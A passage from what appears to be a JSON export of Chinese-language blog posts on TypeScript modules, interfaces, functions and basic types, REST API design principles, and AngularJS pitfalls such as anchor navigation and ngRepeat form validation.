new ERP(); 模块的默认导出模块可以用default关键字实现默认导出功能，每个模块都可以有一个模块导出，类和函数声明可以直接省略导出名来实现默认导出，默认导出有利于减少调用方调用模块的层数，省去冗余模块前缀：123456789101112131415161718192021222324252627282930// 默认导出类// ErpIdentityValidate.tsexport default class ErpIdentityValidate implements IdentityValidate&#123; isStaff(erp: string)&#123; return erpService.contains(erp); &#125;&#125;// test.tsimport Validator from \"./ErpIdentityValidate\";let erp = new Validator();// 默认导出函数// nameServiceValidate.tsexport default function(s: string)&#123; return nameService.contains(s);&#125;// test.tsimport validate from \"./nameServiceValidate\";let name = \"Foo\";console.log(`\"$&#123;name&#125;\" $&#123;validate(name) ? \"matches\" : \"doest not match\"&#125;`);// 默认导出值// constantService.tsexport default \"Foo\";// test.tsimport name from \"./constantService\";console.log(name); 模块设计原则在模块设计中，共同遵循一些原则有利于更好的编写和维护项目代码，比如： 尽可能在顶层导出顶层导出可以降低调用方使用难度，过多的.操作使开发者需要记住很多细节，所以尽量使用默认导出或顶层导出，单个对象（类或函数等）可以采用默认导出的方式。 但若要返回多个对象时，可以采用顶层导出的方式，调用的时候再明确的列出导入的对象名即可。123456789101112// ModuleTest.tsexport class ClassTest&#123; // ...&#125;export funcTest()&#123; // ...&#125;// test.tsimport &#123; ClassTest, funcTest &#125; from \"./ModuleTest\";let C = new ClassTest();funcTest(); 明确的列出导入的名字在导入的时候尽可能明确的指定导入对象的名称，这样只要接口不变，调用方式就可以不变，从而降低了导入和导出模块的耦合度，做到面向接口编程。 使用命名空间模式导出1234567891011121314// ModuleTest.tsexport class ClassTest&#123; // ...&#125;export class ClassTest2()&#123; // ...&#125;export class ClassTest3()&#123; // ...&#125;// test.tsimport * as largeModule from \"./ModuleTest\";let C = new largeModule.ClassTest(); 使用模块包装进行扩展可能进程需要去扩展一个模块的功能，尽量不要去修改原对象而是导出一个新的对象来提供新的功能：123456789101112131415161718192021// ModuleA.tsexport class ModuleA&#123; constructor() &#123; /***/ &#125; sayHello()&#123; // ... &#125;&#125;// ModuleB.tsimprt &#123; ModuleA &#125; from \"./ModuelA.ts\"export class ModuleB extends ModuleA&#123; constructor() &#123; /***/ &#125; sayHi()&#123; // ... &#125;&#125;export &#123; ModuleB as ModuleA &#125;;// test.tsimport &#123; ModuleA &#125; from \"./ModuleB\";let C = new ModuleA(); 接口接口在面向对象设计中非常重要，TypeScript接口的使用方式类似Java，同时增加了灵活性，包括属性、函数、可索引（Indexable Types）和类等 属性类型接口在TypeScript中使用interface关键字来定义接口：1234567891011interface FullName&#123; firstName: string; secondName: string;&#125;function printLabel(name: FullName)&#123; console.log(name.firstName + ' ' + name.secondName);&#125;let myObj = &#123; age: 10, firstName: 'Jim', secondName: 'Ray'&#125;;printLabel(myObj); 上述代码中，FullName接口包含两个属性，且都是字符串类型，而传给printLabel方法的对象只要形式上满足接口的要求即可，接口类型检查器不会去检查属性的顺序，但要保证对应属性存在且类型匹配。 TypeScript还提供了可选属性，可选属性对可能存在的属性进行预定义，并兼容不传值的情况，带有可选属性的几口与普通接口定义方式差不多，只要多加一个?符号即可：1234567interface FullName&#123; firstName: string; secondName?: string;&#125;let myObj = &#123; age: 10, firstName: 'Jim'&#125;; // 由于secondName可选，所以可以不传printLabel(myObj); 函数类型接口接口除了描述带有属性和普通对象外，也能描述函数类型，定义函数类型接口时，需要明确定义函数的参数列表和返回值类，且参数列表的每个参数都要有参数名和类型：12345678910111213interface encrypt&#123; (val:string, salt:string):string&#125; let md5: encrypt;md5 = function(val:string, salt:string)&#123; console.log('orign value:' + val); let encryptValue = doMd5(val, salt); // doMd5仅用于mock console.log('encrypt value:' + encryptValue); return encryptValue;&#125;let pwd = md5('password', 'angular'); 对于函数类型接口需要注意： 函数的参数名，使用时的参数个数需与接口定义的参数相同，对应位置变量的数据类型需保持一致，参数名可以不一样。 函数返回值，函数的返回值类型与接口定义的返回值类型要一致。 可索引类型接口可索引类型接口用来描述那些可以通过索引得到的类型，比如userArray[i], userObject[‘name’]这样的，它包含一个索引签名，表示用来索引的类型与返回值类型，即通过特定的索引来得到指定类型的返回值。123456789101112131415interface UserArray &#123; [index: number]: string&#125;interface UserObject &#123; [index: string]: string&#125;let userArray: UserArray;let userObject: UserObject;userArray = [\"X00\", \"X11\"];userArray = &#123;\"name\": \"X11\"&#125;;console.log(userArray[0]);console.log(userObject['name']); 类类型接口类类型即可用来规范一个类的内容123456789101112interface Animal&#123; name: string; setName(n:string): void;&#125;// 在类中具体实现class Dog implements Animal &#123; name: string; setName(n: string)&#123; this.name = n; &#125; constructor(n: string)&#123; &#125;&#125; 接口扩展和类一样，接口也可以实现相互扩展，即能将成员从一个接口复制到另一个里面，这样可以更灵活的将接口拆分到可复用的模块里1234567891011121314151617181920212223242526272829interface Animal&#123; eat(): void;&#125;interface Person extends Animal&#123; talk(): void;&#125;class Programmer&#123; coding(): void&#123; console.log('coding ... '); &#125;&#125;class Fronter extends Programmer implements Person&#123; eat()&#123; console.log('animal eat'); &#125; talk()&#123; console.log('person talk'); &#125; coding(): void&#123; console.log('fronter coding ... '); &#125;&#125;// 通过组合基础类来实现接口扩展，可以更灵活复用模块let ft = new Fronter();ft.coding();","categories":[{"name":"TypeScript","slug":"TypeScript","permalink":"https://github.com/xmoyKING/categories/TypeScript/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"typescript","slug":"typescript","permalink":"https://github.com/xmoyKING/tags/typescript/"}]},{"title":"TypeScript入门-2-函数/类","slug":"typescript2","date":"2017-09-20T05:59:53.000Z","updated":"2017-12-06T14:50:09.524Z","comments":true,"path":"2017/09/20/typescript2/","link":"","permalink":"https://github.com/xmoyKING/2017/09/20/typescript2/","excerpt":"","text":"函数TypeScript在JS函数的基础上添加了很多功能，使函数变得更好用, 比如声明时，在参数类型和返回值类型这两部分会检查，但在调用时只做参数类型和个数的匹配，不做参数名的校验。123456789// 函数声明写法function max(x: number, y: number): number &#123; return x &gt; y ? x : y;&#125;// 函数表达式写法let max = function(x: number, y: number): number &#123; return x &gt; y ? x : y;&#125;; 可选参数在JS中被调函数的每个参数都是可选的，而在TS中，被掉函数的每个参数都是必传的，在编译时会检查函数每个参数是否传值，即传递时和定义时的参数个数和类型需要匹配。 但常常有需要根据实际需要来决定是否传入某个参数的情况，TS提供了可选参数语法，即在参数名旁加上?来使其变为可选参数，同时可选参数必须位于必选参数后：1234567function max(x: number, y?: number): number &#123; return x &gt; y ? x : y;&#125;max(2); // 通过max(2,3); // 通过max(2,4,5); // 报错 默认参数TS支持初始化默认参数，若函数某个参数设置了默认值，当该函数被调用是， 若没给该参数传值或值为undefined时，那么参数的值就是默认值。1234567function max(x = 4, y: number): number &#123; return x &gt; y ? x : y;&#125;max(undefined, 2); // 通过max(2,3); // 通过max(2,4,5); // 报错 带默认值的参数不必放在必选参数后，但若默认参数放到了必选参数的前面，那么必须显示传入undefined才能使用该默认值。 剩余参数当需要同时操作多个参数，或并不知道会有多少个参数在调用时会传递进函数时，就需要用TS里的剩余参数了，在TS中，所有可选参数都可以放在一个变量中。12345678910function sum(x: number, ...restOfNumber: number[]): number &#123; let ret =x; for(let i = 0; i &lt; restOfNumber.length; i++)&#123; ret += restOfNumber[i]; &#125; return ret;&#125;let ret = sum(1,2,3,4,5); console.log(ret); // 15 注：剩余参数可以理解为个数不限的可选参数，即剩余参数包含的参数个数可以为零到多个。 函数重载TS支持函数重载，通过为同一个函数提供多个函数类型定义来实现多种功能。123456789function func(config: &#123;&#125;);function func(config: string, value: string);function func(config: any, value?: any)&#123; if(typeof config === 'string')&#123; // ... &#125;else if (typeof config === 'object')&#123; // ... &#125;&#125; 上例中，为func函数提供了3个重载定义，编译器会根据参数类型来判断该调用哪个函数，TS的重载是通过查找重载列表来实行匹配的，根据定义的优先顺序来依次匹配，所以在实现重载方法时，一般把最精确的定义放在最前面。 箭头函数JS中的this是非常重要的概念，也非常容易出粗，而箭头函数能很好的解决this的绑定问题。12345678910111213// 问题let gift = &#123; gifts = [1,2,3,4,5,6], giftPicker: function()&#123; return function()&#123; let num = Math.floor(Math.random() * 6); return this.gifts[num]; &#125; &#125;&#125;let picker = gift.giftPicker();console.log(picker()); // 报错 上述代码之所以报错，是因为picker被定义时，giftPicker函数中的this被设置为了window而不是gift对象。根本原因是由于this没有进行动态绑定，即this指向了函数执行时的环境，即window对象。12345678910111213// 使用箭头函数解决问题let gift = &#123; gifts = [1,2,3,4,5,6], giftPicker: function()&#123; return ()=&gt;&#123; // 此处改用箭头函数 let num = Math.floor(Math.random() * 6); return this.gifts[num]; &#125; &#125;&#125;let picker = gift.giftPicker();console.log(picker()); // 通过 类传统的JS程序使用函数和基于原型（Prototype）继承来创建可重用的类，而TS中可以支持基于类的面向对象编程。 声明一个汽车类Car：12345678910111213class Car &#123; engine: string; constructor(engine: string)&#123; this.engine = engine; &#125; drive(distanceInMeters: number = 0)&#123; console.log(`A car runs $&#123;distanceInMeters&#125;m powered by ` + this.engine); &#125;&#125;// 实例化let car = new Car('petrol');car.drive(100); // A car runs 100m powered by petrol 继承与多态封装、继承、多态是面向对象的三大特性，TS中使用extends关键字即可方便的实现继承。12345678910111213141516171819202122// 继承Car类class MotoCar extends Car &#123; constructor(engine: string) &#123; super(engine); &#125;&#125;class Jeep extends Car &#123; constructor(engine: string) &#123; super(engine); &#125; drive(distanceInMeters: number = 100)&#123; console.log('Jeep'); return super.drive(distanceInMeters); &#125;&#125;let tesla = new MotoCar('electricity');let landRover: Car = new Jeep('petrol'); // 实现多态tesla.drive(); // 调用父类的drive方法landRover.dirve(200); // 调用子类Jeep的drive方法 上述代码中，MotoCar和Jeep是基类Car的子类，通过extends来继承父类，子类可以访问父类的属性和方法，也可以重写父类的方法，Jeep中重写了Car的drive方法，这样drive方法在不同的类中就具有不同的功能，如此实现了多态。 注：即使landRover被声明为Car类，它依然是子类Jeep、landRover.drive调用的是Jeep里重写的drive方法，派生类构造函数必须调用super(),它会执行基类的构造函数。 修饰符在类中的修饰符可以分为public、private、protected三种: public为每个成员的默认值，可以被自由访问，也可以显示给类中的成员加上public修饰符 private表示在类的外部无法访问 protected修饰符与private类似，但protected成员在派生类中仍然可以访问12345678910class Car &#123; private _name: string; // 仅Car类中的其他成员函数能够使用 protected engine: string; // 外部无法访问，但子类和自己可以使用 constructor(engine: string)&#123; this.engine = engine; &#125; drive(distanceInMeters: number = 0)&#123; console.log(`A car runs $&#123;distanceInMeters&#125;m powered by ` + this.engine); &#125;&#125; 参数属性参数属性是通过给构造函数参数添加一个访问限定符（public、protected、private）, 参数属性能够方便定义并初始化类成员,即在构造函数内创建并初始化成员属性，从而把声明和赋值合并在一处。1234567class Car &#123; constructor(protected engine: string)&#123;&#125; drive(distanceInMeters: number = 0)&#123; console.log(`A car runs $&#123;distanceInMeters&#125;m powered by ` + this.engine); &#125;&#125; 静态属性类的静态属性存在于类本身而不是类的实例上，类似在实例属性上使用this.来访问属性，使用ClassName.来访问静态属性，使用static关键字来定义类的静态属性：123456789101112131415class Grid &#123; static origin = &#123;x: 0, y: 0&#125;; constructor (public scale: number)&#123;&#125; calculateDistanceFromOrigin(point: &#123;x: number; y: number;&#125;) &#123; let xDist = (point.x - Grid.origin.x); let yDist = (point.y - Grid.origin.y); return Math.sqrt(xDist * x.Dist + yDist * yDist) / this.scale; &#125;&#125;let grid1 = new Grid(1.0);let grid2 = new Grid(5.0);console.log(gird1.calculateDistanceFromOrigin(&#123;x:10, y:10&#125;));console.log(gird2.calculateDistanceFromOrigin(&#123;x:10, y:10&#125;)); 抽象类TS中有抽象类的概念，它是供其他类继承的基类，不能直接被实例化，不同于接口，抽象类必须包含一些抽象方法，同时也可以包含非抽象的成员，abstract关键字用于定义抽象类和抽象方法，抽象类中的抽象方法不包含具体实现并且必须在派生类中实现。123456789101112131415161718abstract class Person &#123; abstract speak(): void; // 必须在派生类中实现 walking(): void &#123; console.log('walking'); &#125;&#125;class Male extends Person &#123; speak(): void &#123; console.log('male ~ '); &#125;&#125;let person: Person; // 创建一个抽象类引用person = new Person(); // 报错person = new Male(); // 通过person.speak(); person.walking();","categories":[{"name":"TypeScript","slug":"TypeScript","permalink":"https://github.com/xmoyKING/categories/TypeScript/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"typescript","slug":"typescript","permalink":"https://github.com/xmoyKING/tags/typescript/"}]},{"title":"TypeScript入门-1-基本类型","slug":"typescript1","date":"2017-09-17T05:59:53.000Z","updated":"2017-12-06T14:50:09.524Z","comments":true,"path":"2017/09/17/typescript1/","link":"","permalink":"https://github.com/xmoyKING/2017/09/17/typescript1/","excerpt":"","text":"TypeScript本质上是向JavaScript语言添加了可选的静态类型和基于类的面向对象编程、同时也支持接口、命名空间、装饰器等特性，相当于JS的超级，与ES5、ES6的关系如下是包含的,TypeScript &gt; ES6 &gt; ES5。 ES6引入let变量声明和const常量声明、模版字符串、箭头函数、类、迭代器、生成器、模块和Promises等新特性。 TypeScript在ES6的基础上增强了类型校验、接口、装饰器等。 详细可参考TypeScript中文网-文档简介 本系列笔记来自《揭秘 Angular 2》一书的TypeScript入门部分。 通过npm安装：1234567npm install -g typescript@2.0.0// 文件hello.tsconsole.log('hello ts');// 将hello.ts编译为hello.jstsc hello.ts 基本类型在TypeScript中声明变量需要加上类型声明，通过静态类型约束，在编译时执行类型检查，能避免类型混用或错误赋值等问题，比如当赋值给不对应的类型时会报错，基本类型包括10种 布尔类型 booleanlet flag: boolean = true; 数字类型 numberTS中的数字都是浮点数，支持二（let binaryNumber: number = 0b1010）、八（0b1010）、十、十六（0xf00d）进制字面量。 字符串类型 stringTS支持单引号’、双引号”表示字符串类型，反引号` 可定义多行文本和内嵌表达式，使用${ expr}嵌入表达式123let name: string = 'ng';let words: string = `$&#123;name&#125; hello`; 数组类 arrayTS数组操作类似JS的数组，TS中最好只为数组定义一个类型，即确定数组中元素类型统一，有两种方式定义数组：12345// 在类型后加上[]let arr: number[] = [1,2];// 或使用数组泛型let arr: Array&lt;number&gt; = [1,2]; 元组类型 tuple元组类型用来表示已知原生数量和类型的数组，各元素的类型不必统一。12345let x: [string, number];x = ['ng', 24];x = [24,'ng']; // 报错console.log(x[0]); // ng 枚举类型 enum枚举是一个可被命名的整数常数的集合，枚举类型为集合成员赋予有意义的名称，增强可读性, 枚举默认下标为0，可手动修改默认下表值123456789enum Color &#123;Red, Blue, Green&#125;;let c: Color = Color.Red;console.log(c); // 0enum Color &#123;Red = 2, Blue, Green&#125;;let c: Color = Color.Blue;console.log(c); // 3 任意值类型 any任意值类型针对编程时类型不确定的变量使用，任意值类型可以让这些变量跳过编译阶段的类型检查，一般用于3种情况： 变量的值会动态变化，比如来自第三方库或用户输入123let x: any = 1; // 数字x = 'ng'; // 字符串x = false; // 布尔值 改写现有代码时，任意值运行在编译时可选的包含或移除类型检查123let x: any = 3;x.fooFunc(); // 因为不知道到fooFunc在运行时是否存在，所以不检测，不报错x.toFixed(); // 数组类型存在此方法 定义存储各种类型的数组时1let arr: any[] = [1, 'ng', false]; null和undefined默认情况下，null和undefined是其他类型的子类型，可以赋值给其他类型，但当TS中启动严格空检查（–strictNullChecks）时，则null和undefined只能被赋值给本身对应的类型或void.12345678910let x: number;x = 1;x = undefined; // 通过x = null; // 通过// --strictNullChecks //启动检查let x: number;x = 1;x = undefined; // 报错x = null; // 报错 通过|符号，表示可以支持多种类型：12345// --strictNullChecks //启动检查let x: number | undefined;x = 1;x = undefined; // 通过x = null; // 报错 一般来说，建议都开启空检查 void类型void表示没有任何类型，例如一个函数没有返回值，即空类型123function hello(): void &#123; // ...&#125; 对应可忽略返回值的回调函数来说，使用void类型比任意类型更安全：1234function func(foo: ()=&gt; void) &#123; let f = foo(); // 函数foo的返回值 f.doSth(); // 报错，因为void类型不存在doSth方法，但若foo: ()=&gt; any 则不会报错，因为任意值类型不检查&#125; never类型never类型是其他所有类型（也包括null和undefined）的子类型，表示不应该出现的值。即声明为never的值只能被never类型赋值，一般来说程序只有在表示异常时采用此类型，表示抛出的异常或无法执行到正常的终止点。12345678910111213141516171819let x: never;let y: number;x = 123; // 报错x = (()=&gt;&#123;throw new Error('exception occur')&#125;)(); // 通过y = (()=&gt;&#123;throw new Error('exception occur')&#125;)(); // 通过，因为never可以赋给number// 定义一个专门抛出异常信息的函数function err(msg: string): never &#123; throw new Error(msg);&#125;// 返回值为never的函数，也可以表示一个无限循环的函数（一般为专门监听的函数）function loop(): never &#123; while(true)&#123; // .... &#125;&#125; 声明和解构在TypeScript中支持var、let、const三种声明方式 let声明let和var声明变量的写法类似，但不同与var，let声明的变量只在块级作用域内有效,同时，在相同的作用域，let不允许变量被重复声明，而var则是无论声明多少次，最近依次声明值有效。 此外需要注意在函数参数同名的情况：1234567891011function func(x)&#123; let x = 1; // 报错，已经在函数参数声明了&#125;function func(condition, x)&#123; if(condition)&#123; let x = 1; // 不报错，覆盖函数同名参数的局部变量声明 return x; // 返回的是局部块级作用域的x &#125; return x;&#125; const声明const声明和let声明类似，与let有一样的作用域规则，但const声明的是常量，常量不能被重新赋值，但若定义的常量是对象，对象里的属性值却可以被重新赋值。12345678910111213const CAT_NUM = 9;const kitty = &#123; name: 'kat', num: CAT_NUM&#125;kitty = &#123; // 报错， name: 'caut', num: CAT_NUM&#125;kitty.name = 'caut'; // 通过kitty.num++ ; // 通过 解构解构是ES6的一个特性，所谓解构就是将声明的一组变量与相同结构的数组或对象的元素数值一一对应，并将变量相对应元素进行赋值，解构可以非常容易的实现多返回值的场景，不仅写法简洁，而且代码可读性很强。 TS中支持数组和对象解构两种不同的解构类型。 数组解构数组解构是最简单的解构类型.123456789101112let input = [1,2];let [first, second] = input;console.log(first, second);// 作用与已声明的变量[first, second] = [second,first]; // 变量交换// 或作用于函数参数function f([first, second] = [number, number])&#123; console.log(first + second);&#125;f([1,2]); // 输出 3 在数组结构使用rest参数语法（形式为...variableName）创建一个剩余变量列表，...三个连续小数点表示展开操作符，用于创建可变长的参数列表，使用起来非常方便。1234let [first, ...rest] = [1,2,3,4];console.log(first); // 1console.log(rest); // [2,3,4] 对象解构对象解构最有用的是在一些原本需要多行编写的代码，用对象解构的方式编写一行就能完成。123let test = &#123;x:0, y:10, width: 10, height: 20&#125;;let &#123;x, y, width, height&#125; = test;console.log(x, y, width, height); 总的而言，解构是很方便的语法，但需要注意，在深层嵌套时比较容易出错。 TypeScript其他TypeScript其他一些周边，如编译配置文件，声明文件，编码工具等。 编译配置文件：tsc编译器有很多命令行参数，都写在命令行上会非常麻烦，tsconfig.json文件则用于解决编译参数的问题，类似package.json文件搜索方式，当运行tsc时，编译器从当前目录向上手势tsconfig.json文件来加载配置。 具体配置文件详细说明可参阅官网。 声明文件：JS语言本身没有静态类型检查功能，TS编译器也只提供了ES标准中的标准库类型声明，只能识别TS代码中的类型，若引入第三方JS库，如jQuery，lodash等，则需要声明文件来辅助开发，在TS中，声明文件是以.d.ts为后缀的文件，主要作用是描述一个JS模块文件所有导出的接口类型信息。 从TS2.0开始，直接使用npm来获取声明文件：1npm install --save @type/lodash 实际上@type/lodash来自DefinitelyTyped项目（github.com/DefinitelyTyped）,在ts中使用该模块则可以直接导入：123import * as _ from \"lodash\";_.padStart('hello ng!', 2, ' '); 也可以通过编译配置文件来自动导入这些模块：12345&#123; \"compilerOptions\": &#123; \"types\": [\"lodash\", \"koa\"] &#125;&#125; 编码工具推荐使用VS Code，其对TS的集成度最好，而且免费。","categories":[{"name":"TypeScript","slug":"TypeScript","permalink":"https://github.com/xmoyKING/categories/TypeScript/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"typescript","slug":"typescript","permalink":"https://github.com/xmoyKING/tags/typescript/"}]},{"title":"如何设计友好的REST API","slug":"rest-api","date":"2017-09-14T13:59:04.000Z","updated":"2017-12-06T14:50:09.415Z","comments":true,"path":"2017/09/14/rest-api/","link":"","permalink":"https://github.com/xmoyKING/2017/09/14/rest-api/","excerpt":"","text":"URI在REST中的典型uri一般是由名称和id组成，如： /users 表示所有用户列表 /users/1 表示id为1的用户 若无特殊要求，id最好使用uuid，即使在非REST的架构中，uuid也有使用简单、无锁的优势。而在REST的架构中，除了上面的优点，还有利于分布式系统中独立处理，可以各自插入数据，而不用担心id冲突。 除了单层资源，在多层资源上，如： /users/1/files 表示用户1的所有文件 /users/1/files/2 表示用户1的文件2 注意：资源层次不是越深约好的，参数过多会有使用不便的问题 理论上，任何多层资源都是由多个两层资源组合二层，所以本质上资源嵌套只要两层就够了，特别是使用uuid的情况下，可以更安全的拆分成两级嵌套，因此，除非在表意上确实有必要，否则使用两层资源即可。 定义uri的一个误区使表一些查询参数直接定义在uri中，如/users/age/20/60，显然比/users?minAge=20&amp;&amp;maxAge=60要难看多了。 资源拆分资源与领域类具有相当高的对应关系，资源的关联结构和领域类的关联结构也具有很大的相似性，当UML图出来的时候，REST API大概也出来了。 对于UML中表现为常规关联（Association，即普通箭头）或聚合（Aggregation，即空心方块）的关联，通常不需要设计多层资源，而组合（Composition,即实心方块）则意味着多层资源。 资源命名如类、变量、函数的命名一样，资源命名也是一门学问。 首先，资源名称应该是名称，也包括动名词的形式，但是不应该是动词。总之，资源要作为能够操作的对象，传统RPC形式的一些API也要映射为对资源的操作，比如登录过程其实就是一个创建安全令牌（Token）的过程，可以将API设计为POST /tokens, 注销则是DELETE /tokens/:id 其次，需要注意名称的表意性，要尽量恰如其分的表示其业务含义，由于API的生命周期通常很长，所以多花精力是值得的。恰如其分就是只要在当前语境下用词贴切即可，不可过于啰嗦，如files不应该命名为userFiles 最后，要避免使用缩写词，避免使用有歧义的缩写甚至自创缩写，但像org这样的众所周知的缩写还是可以使用的。判断命名是否合适，最简单的就是找一个了解业务背景的非技术人员，是否能一眼看懂。 方法除了URI之外，还要遵循METHOD（方法）的使用规范，这个规范不是REST定义的，而是HTTP的规范。METHOD中有两个概念，一个是安全性，一个是幂等性。 安全性HTTP METHOD的安全性其实与传统的“安全”不是一个概念，而是指一项操作不会改变资源的状态，即，该操作对资源是只读的。根据HTTP规范，GET和HEAD是安全的，而POST、PUT、DELETE是不安全的，除此之外、常用的自定义方法PATCH也是不安全的。 这里所说的是“不改变资源的状态”，而不是指不能在服务端做任何改变，比如，在GET方法中记录日志是不违反规范的。遵循安全性的要求来实现方法有利于充分利用互联网的各级缓存设施，无论是在反向代理一级、代理服务器一级还是浏览器一级，都默认对“安全”的请求进行缓存，而会改变状态的操作默认不能缓存，否则容易破坏业务逻辑。 虽然“安全”不是同一概念，但HTTP方法的安全与“攻击”概念下的安全也有一定联系。 若GET方法的实现会改变资源状态，比如，允许通过GET请求投票，那么只要有人点击或者请求这个链接，就会自动“投票”，这就是不安全的了。 还有很多攻击方式，但总体来说，针对GET攻击的手段要比其他METHOD的多一点，所以，让GET实现不要改变资源状态，是一个极容易实现的原则，值得遵循。 幂等性这里的“幂”与数学的“幂”是一个概念。在数学上，x的n次幂表示把x连乘n次，而操作的幂是指把同一个操作连续执行n次。所谓“幂等”，就是指n取任何值其结果都与n取1相等。 操作上的幂等也是这样的概念，比如GET是安全的所以GET不会改变操作的状态，无论GET多少次都不会改变资源的结果，所以GET也是幂等的。而POST会创建一个新的资源，若再次执行同一个代码又会创建一个新的相同的内容，这就不是幂等的。 而DELETE和PUT操作是不安全的，但确实幂等的，比如DELETE操作是删除指定ID的资源，而结果就是该ID的资源被删除导致不存在，再执行一次，资源仍然不存在，所以结果是相同的，所以是幂等的。PUT的原理类似，因为用相同的数据去更新一个资源，其结果相同，无论执行多少次。 幂等的意义在于，它可以安全的自动重试刚才的操作，而不用担心破坏业务逻辑。比如浏览器的页面可以自由刷新，是幂等的，而提交表单却需要提示是否重试，这就是因为POST操作不是幂等的，自动重试将导致预期之外的结果。 关于安全性和幂等性总结为如下的表： 方法 含义 安全 幂等 GET 读取资源列表或指定资源详情 是 是 HEAD 获取资源概况 是 是 POST 创建新资源 否 否 PUT 更新指定资源 否 是 DELETE 创建新资源 否 是 返回值与RPC风格不同，在REST风格中，成功、失败等错误码应该在响应（response）头中作为HTTP status code返回，比如200, 401等，而不能在响应体中返回，这是HTTP规范的要求，也是REST规范所要求的。 在编程时，统一具有很高的实用性。比如在前端写一个过滤层，对服务端的错误信息进行统一处理，在ng中，这种过滤层被成为http interceptor，它可以对每一个发出的包、收到的包进行处理，包括解析内容，修改内容等。 返回码的值需要遵循HTTP规范中的含义，常用如下： 状态码 含义 用法 200 成功 当读取（GET）或更新（PUT）成功时返回 201 已创建 当创建（POST）成功返回 202 已接受 当接受了一个资源，但尚未写入完成时返回，可用于异步处理 204 没有内容 可以用来表示删除（DELETE）成功 … … … 更多更具体可以查看HTTP状态码对照表 大全 除此之外，1xx和3xx系列的状态码表示临时状态，是留给Web服务器层使用的，应用程序不应该主动返回它，前端程序也不需要处理它，除了500和501之外的5xx系列状态码只要保留给各种网关，一般也用不到，若需要使用，则需要到RFC中详细研究含义。 自定义错误码一般应该放在4xx区（失败类）和2xx区（成功类），除非确定无法找到合适的标准码，否则不要自定义状态码，因为自定义状态码需要学习成本，容易让接口丧失通用和简单性。若确定需要自定义，则需要通过充分的沟通同时做好文档工作。 分页API案例以GET /users为例分析一个分页的API设计。 URI的设计：当分页时，分页信息其实是查询参数，不应该成为URI的一部分，应该应该使用GET /users?分页参数 分页参数的设计：有两种方案，一个是“页大小+页号”，一个是“起始位置+条数”。那种更好呢？推荐是后者，因为页面在本质上是前端的概念，前端可以按照每次100项向后端请求数据，但是展示给用户的时候用10项/页展示。若在API中规定了页号，那么使用起来容易导致困惑。甚至，有的时候前端不分页而是采用滚动加载，这种模式的页数就有些别扭了。而“起始位置+条数”的模式则适应性更好，在两种该练下都很容易理解，同时，与数据库中的分页也是相同的概念，所以可以直接传给数据库查询。 命名，尽量统一：建议使用offset和size，条数避免叫length，因为它和数组的长度，字符串长度命名相同，同时容易干扰其他代码或第三方库。 返回值：状态码要遵循前述的规范，注：列表中没有数据是状态码为200，并返回空数组，而有数据时返回一个符合条件的数据列表。ng的$resource.query函数所期待的响应体也是一个数组。当返回的时一个数组而不是对象时，总条数应该放哪儿呢？ 答案是：在响应头中，在响应头中添加一个自定义头，比如X-Record-Count，用来表示符合条件的总条数。 关于METHOD：在SPA模式下，总数可以保存在前端，那么也就意味着没有必要为每个请求都重新请求一次总数，即只需要在页面初始化调用一次即可，使用HEAD /users操作，与其他的GET和POST也不会冲突。但这种方式不适合总条数会随时更新的情况，即新的总数不会在换页时立即刷新出来，此时可以选择使用内容与总条数合一的API，也可以定时刷新总数，具体可以根据需求来，没有一劳永逸的解决方案。","categories":[{"name":"mixed","slug":"mixed","permalink":"https://github.com/xmoyKING/categories/mixed/"}],"tags":[{"name":"rest","slug":"rest","permalink":"https://github.com/xmoyKING/tags/rest/"}]},{"title":"angularjs巩固实践-50-常见“坑”-3-锚点导航、ngRepeat问题、指令优先级","slug":"angularjs50","date":"2017-09-12T01:15:50.000Z","updated":"2017-12-06T14:50:08.915Z","comments":true,"path":"2017/09/12/angularjs50/","link":"","permalink":"https://github.com/xmoyKING/2017/09/12/angularjs50/","excerpt":"","text":"在ng路由中有两种实现方式，分别为HTML5 history和Hashbang，他们对URL解析是有区别的： 锚点导航问题当URL的锚点被Hashbang占用了，那么如何继续实现URL锚点导航定位呢？ng提供了$anchorScroll服务来处理URL锚点的定位,示例如下：1234&lt;div id=\"scrollArea\" ng-controller=\"ScrollCtrl\"&gt; &lt;a ng-click=\"gotoBottom()\"&gt;go to bottom&lt;/a&gt; &lt;span id=\"bottom\"&gt;Bottom&lt;/span&gt;&lt;/div&gt; JS:1234567891011angualr.module('com.ngnice.app').controller('DemoController', function($location, $anchorScroll)&#123; var vm = this; vm.gotoBottom = function()&#123; // location.hash参数为：导航目标节点的id $location.hash('bottom'); $anchorScroll(); // 调用$anchorScroll &#125;; return vm;&#125;); ngRepeat验证失败问题若Form表单控件是利用ngRepeat指令动态生成的，那么可能会遇到无法处理表单验证的问题，因为一旦控件是由ngRepeat动态生成的，那么就无法在Form对象上引用该控件。示例如下：123456789&lt;div ng-form=\"\" name=\"demoForm\"&gt; &lt;div ng-repeat=\"item in [1,2,3]\"&gt; No.&#123;&#123; item &#125;&#125;: &lt;input type=\"number\" ng-model=\"demo.data[$index]\" name=\"amount\" min=\"10\" /&gt; &lt;div ng-show=\"demoForm.amount.$error.min\"&gt; Should more than 10 &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 期望的结果是：当输入小于10时，应该显示错误信息。但此处无法得到预期结果，因ngRepeat中产生的控件并不会把ngModelController注册到ngFormController中，因此验证无法生效。 解决的方法有两种，分别针对简单和复杂的验证： 简单的验证显示对于简单的验证，可以通过在ngRepeat内嵌套一层ngForm组件来引入新的ngFormController：1234567891011&lt;div ng-form=\"\" name=\"demoForm\"&gt; &lt;div ng-repeat=\"item in [1,2,3]\"&gt; &lt;div ng-form=\"\" name=\"demoForm\"&gt; No.&#123;&#123; item &#125;&#125;: &lt;input type=\"number\" ng-model=\"demo.data[$index]\" name=\"amount\" min=\"10\" /&gt; &lt;div ng-show=\"demoForm.amount.$error.min\"&gt; Should more than 10 &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 复杂的验证显示若遇到需要在外部的区域引入表单控件对象时，只能手动将ngModelController注册到ngFormController中去：12345678910111213141516angular.module('com.ngnice.app').directive('dyName', function()&#123; return&#123; require: 'ngModel', link: function(scope, elm, iAttrs, ngModelCtrl)&#123; ngModelCtrl.$name = scope.$eval(iAttrs.dyName); var formController = elm.controller('form') || &#123; $addControl: angular.noop &#125;; formController.$addControl(ngModelCtrl); scope.$on('$destroy', function()&#123; 